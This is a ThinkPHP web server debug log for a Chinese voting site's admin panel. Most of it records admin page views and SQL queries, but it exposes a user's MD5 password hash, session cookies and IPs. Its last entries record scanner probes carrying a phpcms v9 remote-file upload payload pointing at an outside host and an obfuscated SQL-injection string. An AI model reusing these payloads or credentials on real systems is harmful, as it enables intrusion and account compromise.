+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000541s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_role` WHERE  (  role_id = 2 ) LIMIT 1 [ RunTime:0.000167s ]
+[ sql ] [ SQL ] UPDATE `zifi_admin_user`  SET `last_login_ip`='39.90.165.207',`last_login_time`=1506236042  WHERE  `username` = 'user'  AND `password` = 'e10adc3949ba59abbe56e057f20f883e' [ RunTime:0.004498s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T14:54:02+08:00 ] 118.190.138.146 39.90.165.207 GET /index.php/admin/index/index.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/index.html [运行时间：0.030402s][吞吐率：32.89req/s] [内存消耗：3,157.48kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/login/login.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=k709fjm87v3otdmka4gfun0d65',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Index->index[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/index/index.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000344s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000755s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000311s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000545s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000146s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000549s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000180s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000177s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000505s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000192s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T14:54:02+08:00 ] 118.190.138.146 39.90.165.207 GET /index.php/admin/index/main.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/main.html [运行时间：0.029086s][吞吐率：34.38req/s] [内存消耗：3,080.27kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'main',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=k709fjm87v3otdmka4gfun0d65',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Index->main[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/index/main.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+  4 => 'domain',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000382s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000728s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000196s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000544s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000162s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000606s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000173s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000222s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000560s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000162s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T14:54:05+08:00 ] 118.190.138.146 39.90.165.207 GET /index.php/admin/vote/user_list.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/user_list.html [运行时间：0.034147s][吞吐率：29.29req/s] [内存消耗：3,428.34kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'user_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=k709fjm87v3otdmka4gfun0d65',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->user_list[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/vote/user_list.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+  4 => 'list_data',
+  5 => 'keyword',
+  6 => 'ip',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000393s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000729s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000207s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000476s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000139s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000480s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000168s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000178s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000525s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000159s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_user` [ RunTime:0.000539s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `zifi_user` LIMIT 1 [ RunTime:0.000180s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_user` ORDER BY add_time desc LIMIT 0,50 [ RunTime:0.000261s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `zifi_user` LIMIT 1 [ RunTime:0.000150s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T14:54:19+08:00 ] 118.190.138.146 39.90.165.207 POST /index.php/admin/vote/user_set.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/user_set.html [运行时间：0.032730s][吞吐率：30.55req/s] [内存消耗：3,302.46kb] [文件加载：47]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'user_set',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => '*/*',
+  'x-requested-with' => 'XMLHttpRequest',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/vote/user_list.html',
+  'accept-language' => 'zh-CN',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'host' => 'tez.lyzfrj.com',
+  'content-length' => '5',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'cookie' => 'PHPSESSID=k709fjm87v3otdmka4gfun0d65',
+)
+[ info ] [ PARAM ] array (
+  'id' => '93',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->user_set[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000362s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000726s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000205s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000535s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000163s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000496s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000174s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000219s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000517s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000175s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_user` [ RunTime:0.000515s ]
+[ sql ] [ SQL ] UPDATE `zifi_user`  SET `buy`=2  WHERE  `id` = 93 [ RunTime:0.000285s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T14:54:24+08:00 ] 118.190.138.146 39.90.165.207 GET /index.php/admin/vote/user_list.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/user_list.html [运行时间：0.034318s][吞吐率：29.14req/s] [内存消耗：3,428.36kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'user_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=k709fjm87v3otdmka4gfun0d65',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->user_list[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/vote/user_list.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+  4 => 'list_data',
+  5 => 'keyword',
+  6 => 'ip',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000376s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000741s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000207s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000510s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000143s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000525s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000211s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000184s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000520s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000161s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_user` [ RunTime:0.000509s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `zifi_user` LIMIT 1 [ RunTime:0.000173s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_user` ORDER BY add_time desc LIMIT 0,50 [ RunTime:0.000256s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `zifi_user` LIMIT 1 [ RunTime:0.000159s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T18:07:14+08:00 ] 118.190.138.146 39.90.165.207 GET /index.php/admin/index/index.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/index.html [运行时间：0.029682s][吞吐率：33.69req/s] [内存消耗：3,157.19kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'PHPSESSID=bshfs90g76n8m8cvkafd2dgbb2',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Index->index[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/index/index.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000369s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000738s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000201s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000490s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000134s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000485s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000164s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000187s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000489s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000159s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T20:42:03+08:00 ] 118.190.138.146 140.205.225.183 POST /index.php?m=member&c=index&a=register&siteid=1
+[ log ] tez.lyzfrj.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.014915s][吞吐率：67.05req/s] [内存消耗：1,744.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'content-length' => '171',
+  'host' => 'tez.lyzfrj.com:80',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'XGAhkdOw',
+  'password' => 'XGAhkdOw',
+  'email' => 'XGAhkdOw@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T20:42:07+08:00 ] 118.190.138.146 140.205.225.183 GET /index.php?m=wap&a=index&siteid=1
+[ log ] tez.lyzfrj.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.014960s][吞吐率：66.84req/s] [内存消耗：1,741.60kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'tez.lyzfrj.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T20:42:07+08:00 ] 118.190.138.146 140.205.225.183 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ log ] tez.lyzfrj.com:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.014822s][吞吐率：67.47req/s] [内存消耗：1,742.65kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'tez.lyzfrj.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T20:42:07+08:00 ] 118.190.138.146 140.205.225.183 GET /index.php?m=content&c=down&a_k=
+[ log ] tez.lyzfrj.com:80/index.php?m=content&c=down&a_k= [运行时间：0.014655s][吞吐率：68.24req/s] [内存消耗：1,742.05kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'tez.lyzfrj.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'content',
+  'c' => 'down',
+  'a_k' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
